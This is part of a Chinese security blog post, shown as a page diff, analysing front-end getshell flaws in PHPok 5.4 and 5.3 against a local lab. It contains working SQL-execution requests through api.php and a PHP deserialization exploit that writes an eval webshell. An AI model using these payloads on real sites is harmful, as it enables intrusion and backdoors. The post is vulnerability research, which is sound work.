-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cms&#x2F;phpok5.4&#x2F;api.php?c&#x3D;call&amp;f&#x3D;index&amp;data&#x3D;&#123;&quot;m_picplayer&quot;:&#123;&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO &#96;phpok5&#96;.&#96;qinggan_project&#96; (&#96;id&#96;,&#96;module&#96;,&#96;status&#96;,&#96;site_id&#96;,&#96;title&#96;,&#96;nick_title&#96;,&#96;tpl_index&#96;,&#96;tpl_list&#96;,&#96;tpl_content&#96;,&#96;ico&#96;,&#96;orderby&#96;,&#96;alias_title&#96;,&#96;alias_note&#96;,&#96;identifier&#96;,&#96;seo_title&#96;,&#96;seo_keywords&#96;,&#96;seo_desc&#96;,&#96;admin_note&#96;,&#96;post_tpl&#96;,&#96;etpl_admin&#96;,&#96;etpl_user&#96;,&#96;etpl_comment_admin&#96;,&#96;etpl_comment_user&#96;,&#96;tag&#96;,&#96;list_fields&#96;,&#96;style&#96;) values(988,988,66,1,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test&#39;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs autohotkey"><span class="hljs-title">http:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/cms/phpok5.<span class="hljs-number">4</span>/api.php?c=call&amp;f=index&amp;data=&#123;<span class="hljs-string">"m_picplayer"</span>:&#123;<span class="hljs-string">"site"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"type_id"</span>:<span class="hljs-string">"sql"</span>,<span class="hljs-string">"sqlinfo"</span>:<span class="hljs-string">"INSERT INTO `phpok5`.`qinggan_project` (`id`,`module`,`status`,`site_id`,`title`,`nick_title`,`tpl_index`,`tpl_list`,`tpl_content`,`ico`,`orderby`,`alias_title`,`alias_note`,`identifier`,`seo_title`,`seo_keywords`,`seo_desc`,`admin_note`,`post_tpl`,`etpl_admin`,`etpl_user`,`etpl_comment_admin`,`etpl_comment_user`,`tag`,`list_fields`,`style`) values(988,988,66,1,'test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test','test')"</span>&#125;&#125;</code></pre>
 
-<p><img src="./1576069510643.png" alt="1576069510643"></p>
-<p><img src="./1576073388011.png" alt="1576073388011"></p>
+<p><img src="./1576069510643.png" srcset="/img/loading.gif" alt="1576069510643"></p>
+<p><img src="./1576073388011.png" srcset="/img/loading.gif" alt="1576073388011"></p>
 <p>在执行即可在网站根目录生成shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cms&#x2F;phpok5.4&#x2F;api.php?c&#x3D;call&amp;f&#x3D;index&amp;data&#x3D;&#123;%22m_picplayer%22:&#123;%22site%22:1,%22type_id%22:%22fields%22,%22pid%22:988&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs llvm">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/cms/phpok<span class="hljs-number">5.4</span>/api.php?<span class="hljs-keyword">c</span>=<span class="hljs-keyword">call</span>&amp;f=index&amp;data=&#123;<span class="hljs-symbol">%22</span>m_picplayer<span class="hljs-symbol">%22</span>:&#123;<span class="hljs-symbol">%22</span>site<span class="hljs-symbol">%22</span>:<span class="hljs-number">1</span>,<span class="hljs-symbol">%22</span>type_id<span class="hljs-symbol">%22</span>:<span class="hljs-symbol">%22</span>fields<span class="hljs-symbol">%22</span>,<span class="hljs-symbol">%22</span>pid<span class="hljs-symbol">%22</span>:<span class="hljs-number">988</span>&#125;&#125;</code></pre>
 
-<p><img src="./1576073122835.png" alt="1576073122835"></p>
+<p><img src="./1576073122835.png" srcset="/img/loading.gif" alt="1576073122835"></p>
 <h1 id="其他利用链"><a href="#其他利用链" class="headerlink" title="其他利用链"></a>其他利用链</h1><p>有一处利用比较繁琐,但是有任意sql语句执行</p>
 <p>限制：需要一个前台会员账户,或者通过任意sql注入得到用户session_id</p>
 <p>漏洞位置：framework/model/cart.php</p>
 <p>因为$val最后是从数据库中取出,所以可以通过任意sql语句修改数据库达到getshell目的</p>
-<p><img src="./1576119275513.png" alt="1576119275513"></p>
+<p><img src="./1576119275513.png" srcset="/img/loading.gif" alt="1576119275513"></p>
 <ol>
 <li><p>操作购物车需要判断身份,如果没有账号,可以通过sql注入注出<code>qinggan_cart</code> 的session_id字段</p>
 </li>
@@ -235,194 +293,308 @@
 </li>
 </ol>
 <p>   当然这里也可以直接越权,直接到后台,就有一大堆洞</p>
-<p>   <img src="./1576120808919.png" alt="1576120808919"></p>
-<p>   <img src="./1576119462806.png" alt="1576119462806"></p>
+<p>   <img src="./1576120808919.png" srcset="/img/loading.gif" alt="1576120808919"></p>
+<p>   <img src="./1576119462806.png" srcset="/img/loading.gif" alt="1576119462806"></p>
 <ol start="3">
 <li><p>最后满足需要的其他条件,修改qinggan_freight_price表中price字段,就可以执行代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cms&#x2F;phpok5.4&#x2F;api.php?c&#x3D;call&amp;f&#x3D;index&amp;data&#x3D;&#123;&quot;m_picplayer&quot;:&#123;&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;update &#96;phpok54&#96;.&#96;qinggan_freight_price&#96; set price&#x3D;0x706870696E666F28293B2F2F4E where zid&#x3D;25&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs autohotkey"><span class="hljs-title">http:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/cms/phpok5.<span class="hljs-number">4</span>/api.php?c=call&amp;f=index&amp;data=&#123;<span class="hljs-string">"m_picplayer"</span>:&#123;<span class="hljs-string">"site"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"type_id"</span>:<span class="hljs-string">"sql"</span>,<span class="hljs-string">"sqlinfo"</span>:<span class="hljs-string">"update `phpok54`.`qinggan_freight_price` set price=0x706870696E666F28293B2F2F4E where zid=25"</span>&#125;&#125;</code></pre>
 
 </li>
 </ol>
-<p><img src="./1576120561220.png" alt="1576120561220"></p>
+<p><img src="./1576120561220.png" srcset="/img/loading.gif" alt="1576120561220"></p>
 <p>访问：<a href="http://127.0.0.1/cms/phpok5.4/api.php?c=cart&amp;f=pricelist&amp;id=13&amp;address_id=0&amp;province=%E7%A6%8F%E5%B7%9E%E5%B8%82&amp;city=%E4%B8%89%E6%98%8E%E5%B8%82" target="_blank" rel="noopener">http://127.0.0.1/cms/phpok5.4/api.php?c=cart&amp;f=pricelist&amp;id=13&amp;address_id=0&amp;province=%E7%A6%8F%E5%B7%9E%E5%B8%82&amp;city=%E4%B8%89%E6%98%8E%E5%B8%82</a></p>
-<p><img src="./1576121332860.png" alt="1576121332860"></p>
+<p><img src="./1576121332860.png" srcset="/img/loading.gif" alt="1576121332860"></p>
 <h1 id="phpok-5-3"><a href="#phpok-5-3" class="headerlink" title="phpok 5.3"></a>phpok 5.3</h1><p><strong>环境：在form_type=’url’情况下,php5.6无法成功，php7.3成功,php7.0能够写文件但是文件中没内容</strong></p>
 <p>反序列化之后会调用,改行会去取<code>$value[&#39;content&#39;]</code>对象中的属性，造成无法成功调用爆ERROR程序终止，，无法成功执行<code>__destruct</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url &#x3D; $this-&gt;site[&#39;url_type&#39;] &#x3D;&#x3D; &#39;rewrite&#39; ? $value[&#39;content&#39;][&#39;rewrite&#39;] : $value[&#39;content&#39;][&#39;default&#39;];</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs markdown">$url = $this-&gt;site[<span class="hljs-string">'url_type'</span>] == 'rewrite' ? $value[<span class="hljs-string">'content'</span>][<span class="hljs-symbol">'rewrite'</span>] : $value[<span class="hljs-string">'content'</span>][<span class="hljs-symbol">'default'</span>];</code></pre>
 
-<p><img src="./1576237048076.png" alt="1576237048076"></p>
+<p><img src="./1576237048076.png" srcset="/img/loading.gif" alt="1576237048076"></p>
 <p>七月火师傅解决了再借作者评论回复，这里填下坑</p>
-<p><img src="./1576239519071.png" alt="1576239519071"></p>
-<p><img src="./1576239482268.png" alt="1576239482268"></p>
+<p><img src="./1576239519071.png" srcset="/img/loading.gif" alt="1576239519071"></p>
+<p><img src="./1576239482268.png" srcset="/img/loading.gif" alt="1576239482268"></p>
 <p>可以在本地测试下，如果调用不到对象数组属性会造成什么情况</p>
 <p>如下可以得出，由于$a调用了不存在属性值，爆<code>Error</code>,而无法成功执行<code>__destruct</code></p>
-<p><img src="./1576237474445.png" alt="1576237474445"></p>
+<p><img src="./1576237474445.png" srcset="/img/loading.gif" alt="1576237474445"></p>
 <p>但是这里又有个坑，在phpok5.3中7.3可以即使报错依然继续执行代码</p>
 <p>php7.3环境下，执行<code>__get</code>　再执行三元式返回null,程序继续执行</p>
-<p><img src="./1576238022496.png" alt="1576238022496"></p>
+<p><img src="./1576238022496.png" srcset="/img/loading.gif" alt="1576238022496"></p>
 <h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p><strong>适用php7.3</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $key_id=<span class="string">'/var/www/html/cms/5.3/shell'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $key_list=<span class="string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $folder=<span class="string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str1 = json_encode(<span class="keyword">array</span>(<span class="string">'m_picplayer'</span>=&gt;<span class="keyword">array</span>(<span class="string">'site'</span>=&gt;<span class="number">1</span>,<span class="string">'type_id'</span>=&gt;<span class="string">'format_ext_all'</span>,<span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">'form_type'</span>=&gt;<span class="string">'url'</span>,<span class="string">'content'</span>=&gt;serialize(<span class="keyword">new</span> cache())))));</span><br><span class="line"><span class="keyword">print</span>(urlencode($str1));</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span>&#123;
+    <span class="hljs-keyword">protected</span> $key_id=<span class="hljs-string">'/var/www/html/cms/5.3/shell'</span>;
+    <span class="hljs-keyword">protected</span> $key_list=<span class="hljs-string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;
+    <span class="hljs-keyword">protected</span> $folder=<span class="hljs-string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;
+&#125;
+$str1 = json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">'m_picplayer'</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'site'</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">'type_id'</span>=&gt;<span class="hljs-string">'format_ext_all'</span>,<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'form_type'</span>=&gt;<span class="hljs-string">'url'</span>,<span class="hljs-string">'content'</span>=&gt;serialize(<span class="hljs-keyword">new</span> cache())))));
+<span class="hljs-keyword">print</span>(urlencode($str1));</code></pre>
 
 <p><strong>适用php5.6,php7.3</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $key_id=<span class="string">'/var/www/html/cms/5.3/shell'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $key_list=<span class="string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $folder=<span class="string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str1 = json_encode(<span class="keyword">array</span>(<span class="string">'m_picplayer'</span>=&gt;<span class="keyword">array</span>(<span class="string">'site'</span>=&gt;<span class="number">1</span>,<span class="string">'type_id'</span>=&gt;<span class="string">'format_ext_all'</span>,<span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">'form_type'</span>=&gt;<span class="string">'editor'</span>,<span class="string">'content'</span>=&gt;<span class="string">'fuck'</span>,<span class="string">'ext'</span>=&gt;serialize(<span class="keyword">new</span> cache())))));</span><br><span class="line"><span class="keyword">print</span>(urlencode($str1));</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span>&#123;
+    <span class="hljs-keyword">protected</span> $key_id=<span class="hljs-string">'/var/www/html/cms/5.3/shell'</span>;
+    <span class="hljs-keyword">protected</span> $key_list=<span class="hljs-string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;
+    <span class="hljs-keyword">protected</span> $folder=<span class="hljs-string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;
+&#125;
+
+
+$str1 = json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">'m_picplayer'</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'site'</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">'type_id'</span>=&gt;<span class="hljs-string">'format_ext_all'</span>,<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'form_type'</span>=&gt;<span class="hljs-string">'editor'</span>,<span class="hljs-string">'content'</span>=&gt;<span class="hljs-string">'fuck'</span>,<span class="hljs-string">'ext'</span>=&gt;serialize(<span class="hljs-keyword">new</span> cache())))));
+<span class="hljs-keyword">print</span>(urlencode($str1));</code></pre>
 
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/194453" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194453</a></p>
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/12/14/Laravel-5-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Laravel 5.8 反序列化(一)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/11/24/WRITEUP-2019NJUPT-web%E9%A2%98%E8%A7%A3/">
+                        <span class="hidden-mobile">[WRITEUP]2019NJUPT web题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞成因"><span class="toc-number">2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#执行任意sql语句"><span class="toc-number">4.1.</span> <span class="toc-text">执行任意sql语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他利用链"><span class="toc-number">5.</span> <span class="toc-text">其他利用链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpok-5-3"><span class="toc-number">6.</span> <span class="toc-text">phpok 5.3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">7.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">8.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&text=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&is_video=false&description=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PHPok 5.4/5.3前台getshell分析思考(踩坑)&body=Check out this article: http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&name=PHPok 5.4/5.3前台getshell分析思考(踩坑)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&t=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "PHPok 5.4/5.3前台getshell分析思考(踩坑)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
